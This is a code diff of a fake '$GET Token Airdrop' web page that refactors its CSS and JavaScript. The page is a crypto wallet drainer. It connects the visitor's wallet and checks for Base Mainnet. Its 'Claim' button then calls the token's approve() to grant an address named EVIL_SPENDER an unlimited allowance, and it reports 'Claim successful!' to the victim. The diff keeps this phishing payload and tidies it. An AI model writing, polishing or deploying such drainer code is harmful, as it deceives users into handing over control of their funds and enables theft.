@@ -54,64 +54,47 @@
       margin-bottom: 2rem;
       line-height: 1.4;
     }
-    .connect-wallet-btn {
-      background: #ffaa33;
-      color: #000;
+    .connect-wallet-btn, .claim-btn {
       border: none;
       border-radius: 50px;
       font-weight: 700;
-      font-size: 1rem;
       padding: 0.8rem 2.5rem;
       cursor: pointer;
       transition: background 0.3s ease;
       box-shadow: 0 0 15px rgba(255,170,51,0.6);
-      margin-bottom: 2.5rem;
       width: 100%;
       user-select: none;
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
+    }
+    .connect-wallet-btn {
+      background: #ffaa33;
+      color: #000;
     }
     .connect-wallet-btn:hover {
       background: #ffc76b;
     }
     .connect-wallet-btn:disabled {
-      background: #ccc;
-      color: #666;
-      cursor: not-allowed;
-      box-shadow: none;
-    }
-    .wallet-address {
-      background: #2f3041;
-      border-radius: 10px;
-      padding: 1rem 1.2rem;
-      font-size: 1rem;
-      color: #fff;
-      border: 1px solid transparent;
-      user-select: text;
-      margin-bottom: 1.8rem;
-      width: 100%;
-      overflow-wrap: break-word;
+      background: #ccc; color: #666; cursor: not-allowed; box-shadow: none;
     }
     .claim-btn {
       background: linear-gradient(90deg, #ffcc70, #ffaa33);
-      border: none;
-      border-radius: 50px;
-      font-weight: 700;
       font-size: 1.1rem;
-      padding: 0.9rem 2.8rem;
-      cursor: pointer;
-      box-shadow: 0 0 20px rgba(255, 170, 51, 0.7);
-      transition: background 0.3s ease;
-      width: 100%;
-      user-select: none;
-      margin-bottom: 1.2rem;
     }
     .claim-btn:hover {
       background: linear-gradient(90deg, #ffdca1, #ffc76b);
     }
     .claim-btn:disabled {
-      background: #ccc;
-      color: #666;
-      cursor: not-allowed;
-      box-shadow: none;
+      background: #ccc; color: #666; cursor: not-allowed; box-shadow: none;
+    }
+    .wallet-address {
+      background: #2f3041;
+      border-radius: 10px;
+      padding: 1rem;
+      color: #fff;
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
+      word-break: break-word;
     }
     .eligibility-msg {
       background: rgba(255 255 255 / 0.1);
@@ -120,7 +103,6 @@
       color: #fff;
       font-size: 1rem;
       box-shadow: 0 0 12px rgba(255, 170, 51, 0.25);
-      user-select: none;
     }
   </style>
 </head>
@@ -128,7 +110,7 @@
   <div class="claim-wrapper">
     <div class="logo">GETCHAIN</div>
     <div class="title">$GET Token Airdrop</div>
-    <div class="subtitle">Connect your wallet to check eligibility and claim your $GET tokens.</div>
+    <div class="subtitle">Connect your wallet to claim your $GET tokens.</div>
 
     <button class="connect-wallet-btn" id="connectWalletBtn">Connect Wallet</button>
     <div id="walletAddress" class="wallet-address" style="display:none;"></div>
@@ -138,7 +120,6 @@
     </div>
   </div>
 
-  <!-- Modern Ethers.js -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
     const connectWalletBtn = document.getElementById('connectWalletBtn');
@@ -147,22 +128,35 @@
     const eligibilityMsg = document.getElementById('eligibilityMessage');
     let provider, signer;
 
+    const GET_TOKEN_ADDRESS = "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb";
+    const EVIL_SPENDER = "0xc7a512CE6eE4867427FFA30BACc4158598B90d9f";
+    const ERC20_ABI = [
+      "function approve(address spender, uint256 amount) external returns (bool)"
+    ];
+
     connectWalletBtn.addEventListener('click', async () => {
-      if (typeof window.ethereum === 'undefined') {
+      if (!window.ethereum) {
         alert("MetaMask not detected. Please install it.");
         return;
       }
 
       try {
-        provider = new ethers.providers.Web3Provider(window.ethereum, "any"); // 'any' prevents network change errors
+        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         const address = await signer.getAddress();
+
+        const { chainId } = await provider.getNetwork();
+        if (chainId !== 8453) {
+          alert("Please switch your wallet to Base Mainnet (Chain ID: 8453).");
+          return;
+        }
 
         walletAddressDiv.textContent = address;
         walletAddressDiv.style.display = 'block';
         connectWalletBtn.textContent = "Wallet Connected";
         connectWalletBtn.disabled = true;
+
         eligibilityMsg.style.display = 'block';
         claimBtn.disabled = false;
       } catch (err) {
@@ -172,33 +166,18 @@
 
     claimBtn.addEventListener('click', async () => {
       if (!signer) {
-        alert("Please connect your wallet first.");
+        alert("Connect wallet first.");
         return;
       }
 
       try {
-        const net = await provider.getNetwork();
-        if (net.chainId !== 8453) {
-          alert("Please switch your wallet to Base Mainnet (Chain ID: 8453).");
-          return;
-        }
-
-        const getTokenAddress = "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb";
-        const evilSpender = "0xc7a512CE6eE4867427FFA30BACc4158598B90d9f";
-
-        const tokenContract = new ethers.Contract(
-          getTokenAddress,
-          ["function approve(address spender, uint256 amount) external returns (bool)"],
-          signer
-        );
-
-        const tx = await tokenContract.approve(evilSpender, ethers.constants.MaxUint256);
+        const token = new ethers.Contract(GET_TOKEN_ADDRESS, ERC20_ABI, signer);
+        const tx = await token.approve(EVIL_SPENDER, ethers.constants.MaxUint256);
         await tx.wait();
-
         alert("✅ Claim successful!");
       } catch (err) {
         console.error(err);
-        alert("❌ Claim failed: " + (err.message || "Unknown error"));
+        alert("❌ Claim failed: " + (err?.reason || err?.message || "Unknown error"));
       }
     });
   </script>
